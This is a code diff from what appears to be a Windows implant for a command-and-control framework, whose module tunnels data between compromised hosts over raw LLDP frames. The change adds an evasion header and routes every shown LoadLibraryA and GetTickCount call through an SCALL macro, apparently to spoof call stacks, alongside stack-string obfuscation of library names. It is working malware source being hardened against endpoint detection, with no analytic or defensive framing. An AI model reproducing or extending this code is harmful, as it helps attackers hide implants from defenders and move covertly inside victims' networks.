@@ -7,6 +7,7 @@
 #include <strings.h>
 #include <base64.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 using namespace stardust;
 using namespace starburst;
@@ -25,12 +26,12 @@ auto declfn starburst::lldp_resolve_npcap(
 
     STK_WPCAP( _wpcap );
     state->h_wpcap = reinterpret_cast<HMODULE>(
-        inst.kernel32.LoadLibraryA( _wpcap ) );
+        SCALL( inst, kernel32.LoadLibraryA, _wpcap ) );
 
     if ( !state->h_wpcap ) {
         STK_NPCAP_PATH( _npcap_path );
         state->h_wpcap = reinterpret_cast<HMODULE>(
-            inst.kernel32.LoadLibraryA( _npcap_path ) );
+            SCALL( inst, kernel32.LoadLibraryA, _npcap_path ) );
     }
 
     if ( !state->h_wpcap ) return false;
@@ -144,7 +145,7 @@ static bool lldp_get_adapter_mac(
     _Out_   uint8_t*        mac_out
 ) {
     STK_IPHLPAPI( _n );
-    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_iphlpapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_iphlpapi ) return false;
 
     auto pGetAdaptersInfo = reinterpret_cast<lldp_fn_GetAdaptersInfo>(
@@ -209,7 +210,7 @@ static bool lldp_resolve_ip_to_mac(
     _Out_   uint8_t*    mac_out
 ) {
     STK_IPHLPAPI( _n );
-    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_iphlpapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_iphlpapi ) return false;
 
     auto pSendARP = reinterpret_cast<lldp_fn_SendARP>(
@@ -218,7 +219,7 @@ static bool lldp_resolve_ip_to_mac(
     if ( !pSendARP ) return false;
 
     STK_WS2_32( _ws );
-    auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _ws ) );
+    auto h_ws2 = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _ws ) );
     if ( !h_ws2 ) return false;
 
     auto p_inet_addr = reinterpret_cast<ULONG (__stdcall*)(const char*)>(
@@ -481,7 +482,7 @@ static int lldp_send_data(
     _In_    uint8_t*        data,
     _In_    uint32_t        data_len
 ) {
-    uint32_t msg_id = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
+    uint32_t msg_id = (DWORD)SCALL( inst, kernel32.GetTickCount ) & 0x7FFFFFFF;
     uint16_t total  = static_cast<uint16_t>(
         ( data_len + LLDP_MAX_CHUNK_DATA - 1 ) / LLDP_MAX_CHUNK_DATA );
     if ( total == 0 ) total = 1;
@@ -572,10 +573,10 @@ static int lldp_recv_message(
     LldpReassembly ctx;
     memory::zero( &ctx, sizeof( ctx ) );
 
-    DWORD start_tick = inst.kernel32.GetTickCount();
+    DWORD start_tick = (DWORD)SCALL( inst, kernel32.GetTickCount );
 
     while ( true ) {
-        DWORD elapsed = inst.kernel32.GetTickCount() - start_tick;
+        DWORD elapsed = (DWORD)SCALL( inst, kernel32.GetTickCount ) - start_tick;
         if ( elapsed >= (DWORD)timeout_ms ) break;
 
         lldp_pcap_pkthdr* pkt_hdr = nullptr;
@@ -815,7 +816,7 @@ auto declfn starburst::cmd_lldp_connect(
 
     memory::zero( link, sizeof( instance::LldpLink ) );
     memory::copy( link->task_uuid, task_uuid, 36 );
-    link->link_id = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
+    link->link_id = (DWORD)SCALL( inst, kernel32.GetTickCount ) & 0x7FFFFFFF;
     memory::copy( link->peer_mac, peer_mac, 6 );
     link->connected = true;
 
